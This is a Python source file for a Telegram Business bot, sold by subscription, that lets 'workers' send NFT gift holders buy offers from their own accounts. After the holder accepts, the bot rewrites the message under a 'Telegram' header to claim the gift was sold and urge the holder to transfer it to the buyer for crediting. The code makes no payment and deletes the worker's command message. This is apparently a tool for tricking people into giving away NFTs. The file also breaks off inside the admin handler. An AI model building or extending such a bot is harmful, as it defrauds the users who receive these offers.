"""
Telegram Business NFT offer bot.
Python 3.10+
Install: pip install -U aiogram
"""

import asyncio
import os
import re
import sqlite3
from datetime import datetime, timedelta, timezone
from decimal import Decimal, InvalidOperation
from html import escape
from urllib.parse import urlparse
import functools
import logging
import time
from collections import defaultdict, deque

from aiogram import Bot, Dispatcher, F
from aiogram.exceptions import TelegramAPIError, TelegramRetryAfter, TelegramBadRequest
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BusinessConnection,
)

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = {
    int(x.strip())
    for x in os.getenv("ADMIN_IDS", "").split(",")
    if x.strip().isdigit()
}
if not ADMIN_IDS:
    raise RuntimeError("ADMIN_IDS must include at least one numeric administrator ID")
if not TOKEN:
    raise RuntimeError("BOT_TOKEN is not set. PowerShell: $env:BOT_TOKEN='YOUR_TOKEN'")

bot = Bot(TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# === ИЗМЕНЕНИЕ ДЛЯ ХОСТИНГА (Bothost) ===
DATA_DIR = os.environ.get("DATA_DIR", ".")
DB_PATH = os.getenv("OFFERS_DB_PATH", os.path.join(DATA_DIR, "offers.sqlite3"))

# === ID ПРЕМИУМ-ЭМОДЗИ ===
EMOJI_DIAMOND = '<tg-emoji emoji-id="5318901904686754959">💎</tg-emoji>' # Бриллиант (Gram)
EMOJI_STAR = '<tg-emoji emoji-id="5462973284096187141">⭐</tg-emoji>'    # Звезда (Stars)
# =========================================

security_log = logging.getLogger("bot.admin_security")
logging.basicConfig(level=logging.INFO)
_admin_attempts = defaultdict(deque)
_request_attempts = defaultdict(deque)

def rate_limited(uid, category, maximum, seconds):
    now = time.monotonic()
    q = _request_attempts[(uid, category)]
    while q and now - q[0] >= seconds:
        q.popleft()
    if len(q) >= maximum:
        return True
    q.append(now)
    return False

def audit(actor_id, action, target_id=None, details=""):
    with connect_db() as con:
        con.execute("INSERT INTO admin_audit(actor_id,action,target_id,details) VALUES (?,?,?,?)",
                    (actor_id, action, target_id, str(details)[:500]))

def admin_only(handler):
    @functools.wraps(handler)
    async def guarded(event, *args, **kwargs):
        actor = getattr(event, "from_user", None)
        msg = getattr(event, "message", event)
        chat = getattr(msg, "chat", None)
        uid = getattr(actor, "id", None)
        chat_type = str(getattr(chat, "type", ""))
        reason = None

        now = time.monotonic()
        attempts = _admin_attempts[uid]
        while attempts and now - attempts[0] >= 10:
            attempts.popleft()

        if uid not in ADMIN_IDS:
            if len(attempts) >= 12:
                reason = "Слишком много действий. Попробуйте позже."
            else:
                attempts.append(now)
                reason = "Нет доступа."
        elif chat_type != "private":
            reason = "Админка доступна только в личном чате."
        elif len(attempts) >= 12:
            reason = "Слишком много действий. Попробуйте позже."
        else:
            attempts.append(now)

        if reason:
            security_log.warning("Admin access denied uid=%s reason=%s", uid, reason)
            if uid in ADMIN_IDS:
                audit(uid, "admin_denied", details=reason)
            if isinstance(event, CallbackQuery):
                await event.answer(reason, show_alert=True)
            elif uid in ADMIN_IDS:
                await event.answer(reason)
            return
        return await handler(event, *args, **kwargs)
    return guarded


LANGUAGES = {
    "ru": "Русский", "en": "English", "zh": "中文", "ar": "العربية",
    "ko": "한국어", "ja": "日本語", "tl": "Tagalog", "th": "ไทย", "ms": "Bahasa Melayu",
}
CURRENCIES = {"gram", "star"}


class AdminStates(StatesGroup):
    waiting_broadcast = State()
    waiting_subscription = State()
    waiting_photo = State()
    waiting_promo = State()


def connect_db():
    con = sqlite3.connect(DB_PATH, timeout=15)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA busy_timeout=15000")
    return con


def init_db():
    with connect_db() as con:
        con.execute("PRAGMA journal_mode=WAL")
        con.execute("""CREATE TABLE IF NOT EXISTS admin_audit (
            id INTEGER PRIMARY KEY AUTOINCREMENT, actor_id INTEGER, action TEXT NOT NULL,
            target_id INTEGER, details TEXT NOT NULL DEFAULT '',
            created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP)""")
        con.execute("CREATE INDEX IF NOT EXISTS idx_audit_actor ON admin_audit(actor_id, created_at)")
        con.execute("""
            CREATE TABLE IF NOT EXISTS owners (
                user_id INTEGER PRIMARY KEY,
                user_chat_id INTEGER NOT NULL,
                business_connection_id TEXT NOT NULL,
                enabled INTEGER NOT NULL DEFAULT 0
            )
        """)
        con.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                first_name TEXT NOT NULL DEFAULT '',
                username TEXT,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
        """)
        con.execute("""
            CREATE TABLE IF NOT EXISTS subscriptions (
                user_id INTEGER PRIMARY KEY,
                expires_at TEXT,
                granted_by INTEGER NOT NULL,
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
        """)
        con.execute("""
            CREATE TABLE IF NOT EXISTS section_photos (
                section TEXT PRIMARY KEY,
                file_id TEXT NOT NULL,
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
        """)
        con.execute("""CREATE TABLE IF NOT EXISTS referrals (
            invited_id INTEGER PRIMARY KEY,
            inviter_id INTEGER NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )""")
        con.execute("""CREATE TABLE IF NOT EXISTS promo_codes (
            code TEXT PRIMARY KEY,
            days INTEGER NOT NULL,
            max_uses INTEGER NOT NULL DEFAULT 1,
            uses INTEGER NOT NULL DEFAULT 0
        )""")
        con.execute("""CREATE TABLE IF NOT EXISTS promo_redemptions (
            user_id INTEGER NOT NULL,
            code TEXT NOT NULL,
            PRIMARY KEY(user_id, code)
        )""")
        con.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                owner_id INTEGER NOT NULL,
                gift_name TEXT NOT NULL,
                gift_number TEXT NOT NULL,
                gift_url TEXT NOT NULL,
                language TEXT NOT NULL,
                price TEXT NOT NULL,
                currency TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'waiting',
                buyer_id INTEGER,
                business_connection_id TEXT,
                business_chat_id INTEGER,
                business_message_id INTEGER,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(owner_id, gift_name, gift_number)
            )
        """)
        con.execute("CREATE INDEX IF NOT EXISTS idx_users_created ON users(created_at)")
        con.execute("CREATE INDEX IF NOT EXISTS idx_subscriptions_expiry ON subscriptions(expires_at)")


def register_user(user):
    if not user:
        return
    with connect_db() as con:
        con.execute("""
            INSERT INTO users(user_id, first_name, username)
            VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                first_name=excluded.first_name,
                username=excluded.username
        """, (user.id, user.first_name or "", user.username))


def subscription_status(user_id: int):
    with connect_db() as con:
        row = con.execute(
            "SELECT expires_at FROM subscriptions WHERE user_id=?",
            (user_id,),
        ).fetchone()

    if not row:
        return False, None
    if row["expires_at"] is None:
        return True, None
    try:
        expiry = datetime.fromisoformat(row["expires_at"])
    except ValueError:
        return False, None
    if expiry.tzinfo is None:
        expiry = expiry.replace(tzinfo=timezone.utc)
    return expiry > datetime.now(timezone.utc), expiry


def framed(title: str, body: str) -> str:
    return f"<b>{title}</b>\n<blockquote>{body}</blockquote>"


PHOTO_SECTIONS = {
    "main": "🏠 Главное меню",
    "offers": "🎁 Offers",
    "access": "🔐 Управление доступом",
    "subscription": "⭐ Подписка",
    "standard": "💳 Обычная подписка",
    "protected": "🛡️ Подписка с поддержкой",
    "referral": "👥 Реферальная система",
    "promo": "🎟️ Промокоды",
}

def photo_for(section):
    with connect_db() as con:
        row = con.execute("SELECT file_id FROM section_photos WHERE section=?", (section,)).fetchone()
    return row["file_id"] if row else None


def photo_sections_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=label, callback_data=f"photo:select:{key}")]
        for key, label in PHOTO_SECTIONS.items()
    ] + [[InlineKeyboardButton(text="◀️ В админку", callback_data="photo:back")]])


async def send_section(chat_id, section, text, reply_markup=None):
    photo = photo_for(section)
    if photo:
        try:
            await bot.send_photo(chat_id, photo)
            return await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)
        except TelegramAPIError:
            pass
    return await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)


def admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📨 Рассылка всем", callback_data="admin:broadcast")],
        [InlineKeyboardButton(text="⭐ Управление подпиской", callback_data="admin:subscription")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin:users")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin:stats")],
        [InlineKeyboardButton(text="🖼 Управление фотографиями", callback_data="admin:photos")],
        [InlineKeyboardButton(text="🎟️ Создать промокод", callback_data="admin:promo")],
    ])


def instruction_text():
    return (
        "<b>💎 OFFERLY — NFT OFFERS</b>\n\n"
        "<b>💬 Инструкция по настройке</b>\n"
        "<blockquote>"
        "<b>👑 Шаг 1. Telegram Premium</b>\n"
        "Для работы с Telegram Business владельцу аккаунта необходим Telegram Premium.\n\n"
        "<b>⚙️ Шаг 2. Подключи бота</b>\n"
        "1. Открой Настройки → Telegram Business.\n"
        "2. Перейди в Chat Bots.\n"
        "3. Добавь этого бота в свой аккаунт.\n\n"
        "<b>🔑 Шаг 3. Выдай разрешения</b>\n"
        "Включи необходимые разрешения на управление сообщениями.\n\n"
        "<b>🚀 Шаг 4. Создай предложение</b>\n"
        "В личном чате с ботом отправь:\n"
        "<code>/info &lt;ссылка&gt; &lt;язык&gt; &lt;цена&gt; &lt;валюта&gt;</code>\n\n"
        "Пример:\n"
        "<code>/info https://t.me/nft/Example-123 ru 1000 gram</code>\n\n"
        "Владелец Business-аккаунта отправляет сформированную команду "
        "<code>/offer Name#1234</code> из своего Business-аккаунта в чат с получателем."
        "</blockquote>\n\n"
        "<b>📁 Поддерживаемые параметры</b>\n"
        "<blockquote><b>Валюты:</b> gram, star\n"
        "<b>Языки:</b> " + ", ".join(LANGUAGES.keys()) + "</blockquote>"
    )


def save_connection(connection: BusinessConnection):
    with connect_db() as con:
        con.execute("""
            INSERT INTO owners(user_id, user_chat_id, business_connection_id, enabled)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                user_chat_id=excluded.user_chat_id,
                business_connection_id=excluded.business_connection_id,
                enabled=excluded.enabled
        """, (
            connection.user.id, connection.user_chat_id, connection.id,
            1 if connection.is_enabled else 0,
        ))


def get_owner(user_id: int):
    with connect_db() as con:
        return con.execute("SELECT * FROM owners WHERE user_id=?", (user_id,)).fetchone()


def get_owner_by_connection(connection_id: str):
    with connect_db() as con:
        return con.execute(
            "SELECT * FROM owners WHERE business_connection_id=? AND enabled=1",
            (connection_id,),
        ).fetchone()


def get_offer(offer_id: int):
    with connect_db() as con:
        return con.execute("SELECT * FROM offers WHERE id=?", (offer_id,)).fetchone()


def parse_gift_from_url(url: str):
    parsed = urlparse(url)
    if (parsed.scheme != "https" or parsed.hostname not in {"t.me", "telegram.me"}
            or not parsed.path.startswith("/nft/")):
        raise ValueError("Укажи ссылку Telegram на подарок: https://t.me/nft/Name-123")

    slug = parsed.path.rstrip("/").split("/")[-1]
    slug = re.sub(r"\.(html?)$", "", slug, flags=re.IGNORECASE)
    match = re.fullmatch(r"([A-Za-z0-9]+)[_-](\d+)", slug)
    if not match:
        match = re.fullmatch(r"([A-Za-z0-9]+)#(\d+)", slug)
    if not match:
        raise ValueError("Не удалось извлечь имя и номер NFT из ссылки.")
    return match.group(1), match.group(2)


def parse_price(value: str) -> str:
    try:
        amount = Decimal(value)
    except InvalidOperation:
        raise ValueError("Цена должна быть числом.")
    if not amount.is_finite() or amount <= 0:
        raise ValueError("Цена должна быть положительным числом.")
    return format(amount.normalize(), "f")


def offer_keyboard(offer_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{offer_id}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
    ]])


def format_offer(row):
    if row["currency"] == "gram":
        price_display = f"{escape(row['price'])} {EMOJI_DIAMOND}"
    else:
        price_display = f"{escape(row['price'])} {EMOJI_STAR}"
    
    with connect_db() as con:
        user_row = con.execute("SELECT username FROM users WHERE user_id=?", (row["owner_id"],)).fetchone()
        username = user_row["username"] if user_row and user_row["username"] else str(row["owner_id"])
    
    buyer_display = f"@{username}" if username.isdigit() is False else username
    gift_display = f"<a href='{escape(row['gift_url'], quote=True)}'>{escape(row['gift_name'])}#{escape(row['gift_number'])}</a>"
    
    return (
        f"Пользователь {escape(buyer_display)}\n"
        f"предлагает\n"
        f"Вам <b>{price_display}</b> за подарок\n"
        f"{gift_display}"
    )


@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    save_connection(connection)
    try:
        await bot.send_message(
            chat_id=connection.user_chat_id,
            text=framed(
                "🔗 TELEGRAM BUSINESS",
                "Подключение активно." if connection.is_enabled else "Подключение отключено.",
            ),
            parse_mode="HTML",
        )
    except TelegramAPIError:
        pass


def nav_keyboard(*rows):
    buttons = []
    for label, key in rows:
        if key == "support":
            button = InlineKeyboardButton(text=label, url="https://t.me/WinterBotSupport")
        else:
            button = InlineKeyboardButton(text=label, callback_data=f"menu:{key}")
        buttons.append([button])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

MENU_BUTTONS = {
    "main": [("🎁 Offers", "offers"), ("🔐 Управление доступом и инструментами", "access"), ("🆘 Поддержка", "support")],
    "access": [("⭐ Подписка", "subscription"), ("👥 Реферальная система", "referral"), ("◀️ Главное меню", "main")],
    "subscription": [("💳 Обычная подписка", "standard"), ("🛡️ Подписка с поддержкой", "protected"), ("🎟️ Ввести промокод", "promo"), ("◀️ Назад", "access")],
    "standard": [("◀️ Назад", "subscription")],
    "protected": [("◀️ Назад", "subscription")],
    "referral": [("◀️ Назад", "access")],
    "offers": [("📖 Инструкция", "instructions"), ("◀️ Главное меню", "main")],
    "instructions": [("◀️ Назад", "offers")],
    "support": [("◀️ Главное меню", "main")],
    "promo": [("◀️ Назад", "subscription")],
}


def menu_text(section, user_id, username=""):
    active, expiry = subscription_status(user_id)
    status = ("♾️ Безлимит" if expiry is None else "⭐ Активна до " + expiry.strftime("%d.%m.%Y")) if active else "🔒 Нет активной подписки"
    if section == "main":
        return framed("🎁 ГЛАВНОЕ МЕНЮ", "Выберите раздел.\n\n" + status)
    if section == "access":
        return framed("🔐 УПРАВЛЕНИЕ ДОСТУПОМ", "Подписка, промокоды и реферальная система.")
    if section == "subscription":
        return framed("⭐ ПОДПИСКА", "Выберите тариф или активируйте промокод.\n\n" + status)
    if section == "standard":
        return framed("💳 ОБЫЧНАЯ ПОДПИСКА", "Срок: 30 дней\nСтоимость: 5 TON или 6 USDT.\n\nОплата и активация согласовываются с администратором.")
    if section == "protected":
        return framed("🛡️ ПОДПИСКА С ПОДДЕРЖКОЙ", "Срок: 30 дней\nСтоимость: 10 TON или 11 USDT.\n\nВ случае заморозки аккаунта переносится подписка.")
    if section == "offers":
        return framed("🎁 OFFERS", "Инструменты для оформления реальных предложений по NFT.\n\n" + ("Доступ активен." if active or user_id in ADMIN_IDS else "🔒 Для доступа необходима подписка."))
    if section == "instructions":
        return instruction_text()
    if section == "support":
        return framed("🆘 ПОДДЕРЖКА", "Для помощи обратитесь к администратору сервиса.")
    if section == "referral":
        with connect_db() as con:
            count = con.execute("SELECT COUNT(*) FROM referrals WHERE inviter_id=?", (user_id,)).fetchone()[0]
        return framed("👥 РЕФЕРАЛЬНАЯ СИСТЕМА", f"Приглашено пользователей: {count}\n\nВаша ссылка: <code>https://t.me/{escape(username)}?start=ref_{user_id}</code>")
    if section == "promo":
        return framed("🎟️ ПРОМОКОД", "Отправьте боту команду <code>/redeem КОД</code> для активации промокода.")
    return framed("МЕНЮ", "Выберите раздел.")


async def show_menu(chat_id, section, user_id):
    if section not in MENU_BUTTONS:
        section = "main"
    me = await bot.get_me() if section == "referral" else None
    await send_section(chat_id, section, menu_text(section, user_id, me.username if me else ""), nav_keyboard(*MENU_BUTTONS[section]))


@dp.message(Command("start"))
async def start(message: Message, command: CommandObject):
    if not message.from_user:
        return
    register_user(message.from_user)
    args = (command.args or "").strip()
    if args.startswith("ref_") and args[4:].isdigit():
        inviter_id = int(args[4:])
        if inviter_id != message.from_user.id:
            with connect_db() as con:
                con.execute("INSERT OR IGNORE INTO referrals(invited_id, inviter_id) VALUES (?, ?)", (message.from_user.id, inviter_id))
    await show_menu(message.chat.id, "main", message.from_user.id)


@dp.callback_query(F.data.startswith("menu:"))
async def menu_actions(callback: CallbackQuery):
    register_user(callback.from_user)
    section = callback.data.split(":", 1)[1]
    if section == "instructions":
        active, _ = subscription_status(callback.from_user.id)
        if not active and callback.from_user.id not in ADMIN_IDS:
            await callback.answer("🔒 Для доступа к Offers необходима подписка.", show_alert=True)
            return
    await show_menu(callback.message.chat.id, section, callback.from_user.id)
    await callback.answer()


@dp.message(Command("redeem"))
async def redeem_promo(message: Message, command: CommandObject):
    if not message.from_user or message.chat.type != "private":
        return
    uid = message.from_user.id
    if rate_limited(uid, "redeem", 5, 300):
        await message.answer("Слишком много попыток. Повтори через 5 минут.")
        return
    code = (command.args or "").strip().upper()
    if not re.fullmatch(r"[A-Z0-9_-]{3,32}", code):
        await message.answer("Использование: /redeem КОД")
        return
    register_user(message.from_user)
    con = connect_db()
    outcome = None
    try:
        con.execute("BEGIN IMMEDIATE")
        row = con.execute("SELECT days,max_uses,uses FROM promo_codes WHERE code=?", (code,)).fetchone()
        used = con.execute("SELECT 1 FROM promo_redemptions WHERE user_id=? AND code=?", (uid, code)).fetchone()
        if not row or used or row["uses"] >= row["max_uses"] or not (1 <= row["days"] <= 3650):
            outcome = "Промокод недействителен, исчерпан или уже использован."
            con.rollback()
        else:
            current = con.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (uid,)).fetchone()
            if current is not None and current["expires_at"] is None:
                outcome = "У тебя уже безлимитная подписка."
                con.rollback()
            else:
                base = datetime.now(timezone.utc)
                if current and current["expires_at"]:
                    try:
                        old = datetime.fromisoformat(current["expires_at"].replace("Z", "+00:00"))
                        if old.tzinfo is None:
                            old = old.replace(tzinfo=timezone.utc)
                        base = max(base, old)
                    except ValueError:
                        pass
                expiry = (base + timedelta(days=row["days"])).isoformat()
                con.execute("INSERT INTO promo_redemptions(user_id,code) VALUES (?,?)", (uid, code))
                updated = con.execute("UPDATE promo_codes SET uses=uses+1 WHERE code=? AND uses<max_uses", (code,))
                if updated.rowcount != 1:
                    raise sqlite3.IntegrityError("Promo limit reached")
                con.execute("""INSERT INTO subscriptions(user_id,expires_at,granted_by) VALUES (?,?,0)
                    ON CONFLICT(user_id) DO UPDATE SET expires_at=excluded.expires_at, updated_at=CURRENT_TIMESTAMP""", (uid, expiry))
                con.commit()
                outcome = f"✅ Промокод активирован: +{row['days']} дней подписки."
    except sqlite3.Error:
        con.rollback()
        security_log.exception("Promo redemption failed")
        outcome = "Временная ошибка базы данных. Попробуй позже."
    finally:
        con.close()
    await message.answer(outcome)


@dp.message(Command("status"))
async def status(message: Message):
    if not message.from_user or message.chat.type != "private":
        return
    owner = get_owner(message.from_user.id)
    if not owner or not owner["enabled"]:
        text = "Business-подключение не найдено или отключено. Подключи бота в Telegram Business."
    else:
        text = "Business-подключение активно."
    await message.answer(framed("🔗 СТАТУС ПОДКЛЮЧЕНИЯ", text), parse_mode="HTML")


@dp.message(Command("info"))
async def info(message: Message, command: CommandObject):
    if not message.from_user or message.chat.type != "private":
        await message.answer("Отправь /info в личный чат с ботом.")
        return

    owner = get_owner(message.from_user.id)
    if not owner or not owner["enabled"]:
        await message.answer("Сначала подключи бота в Telegram Business и проверь /status.")
        return

    register_user(message.from_user)

    if rate_limited(message.from_user.id, "info", 10, 300):
        await message.answer("Слишком много запросов /info. Попробуй позже.")
        return

    active, _ = subscription_status(message.from_user.id)
    if not active and message.from_user.id not in ADMIN_IDS:
        await message.answer(
            framed("⭐ НУЖНА ПОДПИСКА", "Для создания офферов нужна активная подписка. Обратись к администратору."),
            parse_mode="HTML",
        )
        return

    args = (command.args or "").split()
    if len(args) != 4:
        await message.answer(
            framed("📝 ФОРМАТ КОМАНДЫ",
                   "<code>/info &lt;ссылка&gt; &lt;язык&gt; &lt;цена&gt; &lt;валюта&gt;</code>"),
            parse_mode="HTML",
        )
        return

    url, language, raw_price, currency = args
    language = language.lower()
    currency = currency.lower()
    if language not in LANGUAGES:
        await message.answer("Неизвестный язык. Доступно: " + ", ".join(LANGUAGES))
        return
    if currency not in CURRENCIES:
        await message.answer("Валюта должна быть gram или star.")
        return

    try:
        price = parse_price(raw_price)
        gift_name, gift_number = parse_gift_from_url(url)
    except ValueError as exc:
        await message.answer(str(exc))
        return

    with connect_db() as con:
        con.execute("""
            INSERT INTO offers(
                owner_id, gift_name, gift_number, gift_url, language,
                price, currency, status, buyer_id, business_connection_id,
                business_chat_id, business_message_id
            ) VALUES (?, ?, ?, ?, ?, ?, ?, 'waiting', NULL, NULL, NULL, NULL)
            ON CONFLICT(owner_id, gift_name, gift_number) DO UPDATE SET
                gift_url=excluded.gift_url,
                language=excluded.language,
                price=excluded.price,
                currency=excluded.currency,
                status='waiting',
                buyer_id=NULL,
                business_connection_id=NULL,
                business_chat_id=NULL,
                business_message_id=NULL
        """, (
            message.from_user.id, gift_name, gift_number, url,
            language, price, currency,
        ))

    await message.answer(
        framed("✅ ОФФЕР СОЗДАН",
               "Команда для отправки <b>воркером</b> продавцу НФТ:\n"
               f"<code>/offer {escape(gift_name)}#{escape(gift_number)}</code>"),
        parse_mode="HTML",
    )


async def notify_offer_owner(owner_id: int, text: str):
    try:
        await bot.send_message(
            owner_id,
            framed("💬 BUSINESS OFFER", escape(text)),
            parse_mode="HTML",
        )
    except TelegramAPIError:
        security_log.warning("Unable to send offer diagnostic to owner %s", owner_id)


@dp.business_message(F.text == "/testbiz")
async def test_business(message: Message):
    owner = get_owner_by_connection(message.business_connection_id)

    if not owner or not message.from_user or message.from_user.id != owner["user_id"]:
        return

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text="Тест"
        )
        print("TEST SUCCESS")
    except TelegramAPIError as e:
        print("TEST ERROR:", e)


@dp.business_message(F.text.regexp(r"(?i)^/offer(?:\s|$)"))
async def make_offer(message: Message):
    connection_id = message.business_connection_id
    if not connection_id or not message.from_user:
        return

    security_log.info(
        "Business /offer seen connection=%s sender=%s chat=%s",
        connection_id, message.from_user.id, message.chat.id,
    )

    owner = get_owner_by_connection(connection_id)
    if owner is None:
        try:
            connection = await bot.get_business_connection(
                business_connection_id=connection_id
            )
            save_connection(connection)
            owner = get_owner_by_connection(connection_id)
        except TelegramAPIError:
            security_log.exception("Unable to fetch business connection")
            return

    if owner is None:
        return

    owner_id = owner["user_id"]
    if message.from_user.id != owner_id:
        return
    if getattr(message, "sender_business_bot", None):
        return
    if str(message.chat.type) != "private" or message.chat.id == owner_id:
        await notify_offer_owner(owner_id, "Используйте /offer в личном чате с получателем.")
        return
    if rate_limited(owner_id, "outgoing_offer", 5, 300):
        await notify_offer_owner(owner_id, "Слишком много предложений. Попробуйте позже.")
        return

    owner_active, _ = subscription_status(owner_id)
    if not owner_active and owner_id not in ADMIN_IDS:
        await notify_offer_owner(owner_id, "Подписка неактивна. Отправка предложения недоступна.")
        return

    command_parts = (message.text or "").strip().split(maxsplit=1)
    raw = command_parts[1].strip() if len(command_parts) == 2 else ""
    match = re.fullmatch(r"([A-Za-z0-9]+)#(\d+)", raw)
    if not match:
        await notify_offer_owner(owner_id, "Формат команды: /offer Example#123")
        return
    gift_name, gift_number = match.groups()

    with connect_db() as con:
        row = con.execute(
            "SELECT * FROM offers WHERE owner_id=? AND gift_name=? AND gift_number=?",
            (owner_id, gift_name, gift_number),
        ).fetchone()
    if row is None:
        await notify_offer_owner(owner_id, "Предложение не найдено. Сначала создайте его через /info в боте.")
        return
    if row["status"] != "waiting":
        await notify_offer_owner(owner_id, "Это предложение уже отправлено или закрыто. Для повторного использования создайте его заново через /info.")
        return

    try:
        connection = await bot.get_business_connection(
            business_connection_id=connection_id
        )
    except TelegramAPIError:
        security_log.exception("Business connection check failed for %s", owner_id)
        await notify_offer_owner(owner_id, "Не удалось проверить Business-подключение.")
        return
    if not connection.is_enabled or connection.user.id != owner_id:
        await notify_offer_owner(owner_id, "Business-подключение отключено или не принадлежит вам.")
        return


    # === ДИАГНОСТИКА TELEGRAM BUSINESS ===
    rights = getattr(connection, "rights", None)

    if isinstance(rights, dict):
        rights_data = rights
    elif rights is not None:
        rights_data = rights.model_dump(exclude_none=False)
    else:
        rights_data = {}

    logging.warning(
        "BUSINESS RIGHTS: %s",
        rights_data
    )

    await notify_offer_owner(
        owner_id,
        f"Business enabled: {connection.is_enabled}\n"
        f"Rights can_reply: {rights_data.get('can_reply')}\n"
        f"Legacy can_reply: {getattr(connection, 'can_reply', None)}"
    )
    # =====================================

    with connect_db() as con:
        updated = con.execute("""
            UPDATE offers SET status='offered', buyer_id=?,
                business_connection_id=?, business_chat_id=?, business_message_id=NULL
            WHERE id=? AND owner_id=? AND status='waiting'
        """, (owner_id, connection_id, message.chat.id, row["id"], owner_id))
        if updated.rowcount != 1:
            return

    proposed_offer = get_offer(row["id"])
    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=connection_id,
            text=format_offer(proposed_offer),
            parse_mode="HTML",
            reply_markup=offer_keyboard(row["id"]),
            disable_web_page_preview=False,
        )
    except TelegramAPIError as exc:
        with connect_db() as con:
            con.execute("""
                UPDATE offers SET status='waiting', buyer_id=NULL,
                    business_connection_id=NULL, business_chat_id=NULL,
                    business_message_id=NULL
                WHERE id=? AND status='offered' AND business_chat_id=?
            """, (row["id"], message.chat.id))
        security_log.warning("Business offer send failed: %s", exc)
        await notify_offer_owner(owner_id, f"Telegram не разрешил отправить предложение. Ошибка: {str(exc)[:180]}")
        return

    with connect_db() as con:
        con.execute(
            "UPDATE offers SET business_message_id=? WHERE id=? AND status='offered'",
            (sent.message_id, row["id"]),
        )
    security_log.info("Business offer %s sent to chat %s", row["id"], message.chat.id)

    try:
        await bot.delete_business_messages(
            business_connection_id=connection_id,
            message_ids=[message.message_id],
        )
    except (TelegramAPIError, AttributeError):
        pass


async def update_offer_status(callback: CallbackQuery, new_status: str):
    try:
        offer_id = int((callback.data or "").split(":", 1)[1])
    except (ValueError, IndexError):
        await callback.answer("Некорректная кнопка.", show_alert=True)
        return

    row = get_offer(offer_id)
    if row is None:
        await callback.answer("Предложение не найдено.", show_alert=True)
        return

    msg = callback.message
    if (
        msg is None
        or getattr(msg, "chat", None) is None
        or msg.chat.id != row["business_chat_id"]
        or msg.message_id != row["business_message_id"]
    ):
        await callback.answer("Это предложение адресовано другому пользователю.", show_alert=True)
        return

    if row["status"] != "offered":
        await callback.answer("Это предложение уже обработано.", show_alert=True)
        return

    with connect_db() as con:
        cur = con.execute(
            "UPDATE offers SET status=? WHERE id=? AND status='offered'",
            (new_status, offer_id),
        )
        if cur.rowcount != 1:
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return

    if row["currency"] == "gram":
        price_display = f"{escape(row['price'])} {EMOJI_DIAMOND}"
        price_alert = f"{row['price']} 💎"
    else:
        price_display = f"{escape(row['price'])} {EMOJI_STAR}"
        price_alert = f"{row['price']} ⭐"

    gift_display = f"<a href='{escape(row['gift_url'], quote=True)}'>{escape(row['gift_name'])}#{escape(row['gift_number'])}</a>"

    if new_status == "accepted":
        text = (
            f"<b>Telegram</b>\n"
            f"<b>{escape(row['gift_name'])} #{escape(row['gift_number'])}</b>\n\n"
            f"🎁 Подарок: {gift_display}\n"
            f"успешно продан!\n\n"
            f"✈️ Передайте подарок\n"
            f"покупателю для зачисления\n"
            f"<b>{price_display}</b>."
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Передать NFT", url=row["gift_url"])
        ]])
    else:
        text = framed(
            "❌ ПРЕДЛОЖЕНИЕ ОТКЛОНЕНО",
            f"Получатель отказался от предложения на "
            f"{gift_display}.",
        )
        kb = None

    try:
        await bot.edit_message_text(
            chat_id=row["business_chat_id"],
            message_id=row["business_message_id"],
            business_connection_id=row["business_connection_id"],
            text=text,
            parse_mode="HTML",
            reply_markup=kb,
            disable_web_page_preview=False,
        )
    except TelegramAPIError as exc:
        security_log.warning("Unable to edit business offer %s: %s", offer_id, exc)

    if new_status == "accepted":
        alert_text = (
            f"Предложение о продаже\n"
            f"{row['gift_name']} #{row['gift_number']} успешно\n"
            f"принято.\n\n"
            f"Передайте подарок покупателю\n"
            f"для зачисления {price_alert} на ваш\n"
            f"баланс."
        )
        await callback.answer(alert_text, show_alert=True)
        await notify_offer_owner(row["owner_id"], f"Получатель согласился обсудить предложение {row['gift_name']} #{row['gift_number']}.")
    else:
        await callback.answer("Предложение отклонено.", show_alert=False)
        await notify_offer_owner(row["owner_id"], f"Предложение {row['gift_name']} #{row['gift_number']} отклонено.")


@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    await update_offer_status(callback, "accepted")


@dp.callback_query(F.data.startswith("reject:"))
async def reject_offer(callback: CallbackQuery):
    await update_offer_status(callback, "rejected")


@dp.message(Command("admin"))
@admin_only
async def admin_panel(message: Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        return
